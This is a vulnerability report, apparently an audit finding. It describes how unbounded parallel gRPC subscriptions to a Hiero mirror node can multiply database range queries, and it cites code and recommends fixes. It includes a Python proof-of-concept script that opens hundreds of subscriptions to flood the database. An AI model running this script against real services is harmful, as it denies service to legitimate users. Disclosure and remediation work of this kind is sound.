### Title
Unbounded Parallel Subscriptions Enable DB Query Amplification via Independent `missingMessages()` Calls

### Summary
Any unauthenticated caller can open an arbitrary number of gRPC subscriptions to a single topic by multiplexing across multiple connections, bypassing the per-connection limit of 5. Each subscription maintains fully independent state (`TopicContext`) with no shared cache or deduplication, so every message gap triggers one DB range query per active subscription. DB load scales linearly with the number of attacker-controlled subscriptions.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` (no auth check) → `TopicMessageServiceImpl.subscribeTopic()` → per-subscription `TopicContext` → two independent DB-query trigger paths:

**Path 1 – Safety check** (`subscribeTopic()`, lines 67–70):
```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
``` [1](#0-0) 

For any subscription without an `endTime`, `isComplete()` always returns `false` (line 204–205), so this fires unconditionally after 1 second for every subscription, issuing a `topicMessageRetriever.retrieve()` DB call per subscription. [2](#0-1) 

**Path 2 – Gap fill** (`incomingMessages()`, line 120 → `missingMessages()`, lines 164–177):
```java
return topicListener.listen(newFilter).concatMap(t -> missingMessages(topicContext, t));
``` [3](#0-2) 

When a live message arrives with a non-consecutive sequence number, each subscription independently builds a new `TopicMessageFilter` and calls `topicMessageRetriever.retrieve(newFilter, false)`: [4](#0-3) 

**Root cause:** Each `subscribeTopic()` call allocates a completely independent `TopicContext` with no shared state, no result cache, and no deduplication across subscriptions to the same topic. There is no global subscription cap and no per-IP/per-user limit. [5](#0-4) 

**Why the only existing check is insufficient:**

`maxConcurrentCallsPerConnection = 5` (documented default) limits calls *per TCP connection*, not globally. An attacker opens `C` connections and gets `5C` concurrent subscriptions with no server-side enforcement beyond that. [6](#0-5) 

The `subscriberCount` AtomicLong is a Micrometer gauge for observability only — it is never checked against a maximum to reject new subscriptions. [7](#0-6) 

### Impact Explanation
Each gap event (or the 1-second safety-check trigger) causes one DB range query per active subscription. With `N` attacker subscriptions across `N/5` connections, the DB receives `N` overlapping range queries for the same data simultaneously. This exhausts the DB connection pool and statement-execution threads, degrading or denying service for all legitimate subscribers. The impact is proportional to `N` and requires no economic cost to the attacker (no on-chain transactions needed).

### Likelihood Explanation
The gRPC port is publicly accessible with no authentication. Opening hundreds of connections and 5 subscriptions each requires only a standard gRPC client and a loop. The attack is trivially scriptable, repeatable, and requires no special knowledge beyond the topic ID. The 1-second safety-check path guarantees at least one DB query per subscription even on a quiet topic, making the attack reliable regardless of actual message gap frequency.

### Recommendation
1. **Global subscription cap**: Check `subscriberCount` against a configurable maximum before accepting a new subscription; return `RESOURCE_EXHAUSTED` if exceeded.
2. **Per-IP/per-connection subscription limit**: Track active subscriptions per remote address and enforce a per-source cap.
3. **Shared gap-fill cache**: Deduplicate concurrent `missingMessages()` DB queries for the same topic and time range across subscriptions (e.g., using `Mono.cache()` keyed on `(topicId, startTime, endTime)`).
4. **Safety-check deduplication**: Coordinate the safety-check query at the topic level rather than per-subscription.

### Proof of Concept
```python
import grpc, threading
from com.hedera.hashgraph.sdk.proto import consensus_service_pb2_grpc, consensus_service_pb2
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "mirror-node-grpc:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1234
NUM_CONNECTIONS = 100  # 100 connections × 5 calls each = 500 subscriptions

def open_subscriptions(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=...,  # target topic
        consensusStartTime=Timestamp(seconds=0),
        # no endTime → isComplete() always false → safety check fires every subscription
    )
    # 5 concurrent streaming calls on this connection
    threads = [threading.Thread(target=lambda: list(stub.subscribeTopic(query)))
               for _ in range(5)]
    for t in threads: t.start()
    for t in threads: t.join()

workers = [threading.Thread(target=open_subscriptions, args=(i,))
           for i in range(NUM_CONNECTIONS)]
for w in workers: w.start()
# Result: 500 independent DB range queries fire simultaneously after ~1 second
```
After ~1 second, 500 independent `topicMessageRetriever.retrieve()` DB queries are issued simultaneously. On any subsequent message gap, 500 more overlapping range queries are issued. DB CPU and connection-pool utilization spike proportionally, degrading service for all users.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-48)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L61-61)
```java
        TopicContext topicContext = new TopicContext(filter);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L67-70)
```java
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L120-120)
```java
        return topicListener.listen(newFilter).concatMap(t -> missingMessages(topicContext, t));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L164-177)
```java
        TopicMessageFilter newFilter = topicContext.getFilter().toBuilder()
                .endTime(current.getConsensusTimestamp())
                .limit(numMissingMessages)
                .startTime(last.getConsensusTimestamp() + 1)
                .build();

        log.info(
                "[{}] Querying topic {} for missing messages between sequence {} and {}",
                newFilter.getSubscriberId(),
                topicContext.getTopicId(),
                last.getSequenceNumber(),
                current.getSequenceNumber());

        return topicMessageRetriever.retrieve(newFilter, false).concatWithValues(current);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-205)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
```

**File:** docs/configuration.md (L424-424)
```markdown
| `hiero.mirror.grpc.netty.maxConcurrentCallsPerConnection`  | 5                | The maximum number of concurrent calls permitted for each incoming connection                             |
```
